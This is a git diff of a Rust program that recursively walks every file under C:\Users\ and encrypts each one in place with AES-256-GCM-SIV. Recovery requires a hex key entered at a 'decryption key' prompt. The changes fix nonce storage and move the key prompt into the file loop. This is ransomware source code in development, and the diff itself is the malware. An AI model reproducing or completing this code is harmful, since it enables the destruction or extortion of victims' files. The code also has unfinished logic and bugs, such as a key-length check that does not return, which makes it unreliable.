@@ -7,6 +7,7 @@ use crossterm::event::{poll, read, Event, KeyCode};
 use crossterm::terminal::enable_raw_mode;
 use crypto::common::typenum::U32;
 use dialog::{backends::Zenity, DialogBox};
+use dioxus_desktop::wry::http::header::RETRY_AFTER;
 use eframe::egui;
 use hex;
 use rand_chacha::rand_core::{RngCore, SeedableRng};
@@ -129,6 +130,8 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
     //search recursively through all directories and find files
     let mut test_file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
 
+    //
+
     for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
         match entry {
             Ok(entry) => {
@@ -142,11 +145,29 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
                     //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
                     //FIXME: herererer
                     if do_encrypt {
-                        encrypt(entry.path(), cipher);
+                        encrypt(entry.path(), &cipher);
 
                         // encrypt(entry.path(), cipher);
                     } else {
-                        decrypt(entry.path(), cipher);
+                        let mut user_input = String::new();
+                        //FIXME: thisis the popup stage
+                        println!("Enter decryption key pls: ");
+                        io::stdin().read_line(&mut user_input).unwrap();
+                        let user_input_str = user_input.trim(); //convert to bytes
+
+                        //key length 32, nonce length 12
+                        if user_input_str.len() != 64 {
+                            //64 because it's in hex
+                            //print error
+                            println!("Invalid key length: {}", user_input_str.len());
+                            //FIXME: return here
+                        }
+                        let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
+                        let decrypt_key: GenericArray<u8, U32> =
+                            GenericArray::clone_from_slice(&user_input_bytes.as_slice());
+                        let cipher = Aes256GcmSiv::new(&decrypt_key);
+
+                        decrypt(entry.path(), &cipher);
                     }
                 }
             }
@@ -156,6 +177,26 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
         }
     }
     Ok(())
+}
+
+pub struct MyError {
+    message: String,
+}
+
+impl From<std::io::Error> for MyError {
+    fn from(err: std::io::Error) -> Self {
+        Self {
+            message: err.to_string(),
+        }
+    }
+}
+
+impl From<walkdir::Error> for MyError {
+    fn from(err: walkdir::Error) -> Self {
+        Self {
+            message: err.to_string(),
+        }
+    }
 }
 
 /**
@@ -182,28 +223,9 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
     let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
     //put the ciphertext bac into the file
     file.set_len(0);
+    file.write_all(&nonce_array)?;
     file.write_all(&ciphertext.unwrap().as_slice());
     Ok(())
-}
-
-pub struct MyError {
-    message: String,
-}
-
-impl From<std::io::Error> for MyError {
-    fn from(err: std::io::Error) -> Self {
-        Self {
-            message: err.to_string(),
-        }
-    }
-}
-
-impl From<walkdir::Error> for MyError {
-    fn from(err: walkdir::Error) -> Self {
-        Self {
-            message: err.to_string(),
-        }
-    }
 }
 
 /**
@@ -211,40 +233,37 @@ impl From<walkdir::Error> for MyError {
  * this is not finished. the main decryption is in main atm
  */
 fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), std::io::Error> {
-    loop {
-        //TODO: move all of this to a decryption function
-        let mut user_input = String::new();
-        //FIXME: thisis the popup stage
-        println!("Enter decryption key pls: ");
-        io::stdin().read_line(&mut user_input).unwrap();
-        let user_input_str = user_input.trim(); //convert to bytes
+    let mut file = File::open(path)?;
+    let mut buffer = Vec::new();
+    file.read_to_end(&mut buffer)?;
 
-        //key length 32, nonce length 12
-        if user_input_str.len() != 64 {
-            //64 because it's in hex
-            //print error
-            println!("Invalid key length: {}", user_input_str.len());
-        } else {
-            let user_input_bytes = hex::decode(user_input_str).unwrap().to_owned();
-            let decrypt_key: GenericArray<u8, U32> =
-                GenericArray::clone_from_slice(&user_input_bytes.as_slice());
+    //FIXME: get nonce from first 32 bytes from file
+    let nonce = Nonce::from_slice(&buffer[0..12]);
+    let ciphertext = &buffer[12..];
 
-            let mut file = File::open(path)?;
-            let mut buffer = Vec::new();
-            file.read_to_end(&mut buffer)?;
+    // let cipher = Aes256GcmSiv::new(&decrypt_key);
 
-            //FIXME: get nonce from first 32 bytes from file
-            let nonce = Nonce::from_slice(&buffer[0..12]);
-            let ciphertext = &buffer[12..];
-
-            let cipher = Aes256GcmSiv::new(&decrypt_key);
-            let plaintext = cipher.decrypt(nonce, ciphertext);
-
+    println!("helloo");
+    match cipher.decrypt(nonce, ciphertext) {
+        Ok(plaintext) => {
+            println!("Decrypt path: {}", path.display());
             let mut file = File::create(path)?;
+            println!("creating file");
             file.set_len(0);
-            file.write_all(&plaintext.unwrap().as_slice());
-            // break;
+            println!("setting len");
+            file.write_all(&plaintext.as_slice())?;
+            println!("writing to file");
         }
+        Err(e) => {
+            println!("Decrypt fail: {:?}", e); //FIXME: return
+                                               //skip fail
+        } // let plaintext = cipher.decrypt(nonce, ciphertext);
+
+          // let mut file = File::create(path)?;
+          // file.set_len(0);
+          // file.write_all(&plaintext.unwrap().as_slice());
+          // break;
     }
+
     Ok(())
 }
